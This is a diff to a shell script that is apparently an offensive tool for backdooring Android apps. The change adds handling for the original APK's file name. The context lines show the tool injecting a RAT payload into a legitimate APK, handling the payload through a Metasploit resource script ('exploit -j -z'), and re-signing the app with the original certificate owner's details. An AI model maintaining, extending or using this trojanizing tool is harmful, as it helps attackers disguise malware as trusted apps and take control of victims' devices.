@@ -37,6 +37,7 @@ ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
 MY_PATH=`pwd`
 TMP_DIR=$MY_PATH/tmp
 ORIG_APK_FILE=$1
+ORIG_APK_FILE_NAME=""
 RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
 TIME_OF_RUN=`date`
@@ -275,6 +276,8 @@ exploit -j -z
 EOL
 echo "[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc"
 
+ORIG_APK_FILE_NAME=`echo "${ORIG_APK_FILE##*/}"`
+echo "Wroking on original APK: $ORIG_APK_FILE_NAME" >>$LOG_FILE 2>&1
 echo -n "[*] Decompiling original APK file..."
 $APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
@@ -672,7 +675,7 @@ if [ $rc != 0 ]; then
 fi
 
 keystore=$MY_PATH/signing.keystore
-compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE
+compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE_NAME
 unaligned_apk=$MY_PATH/original/dist/unaligned.apk
 
 dname=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Owner:" |sed 's/^.*: //g'`
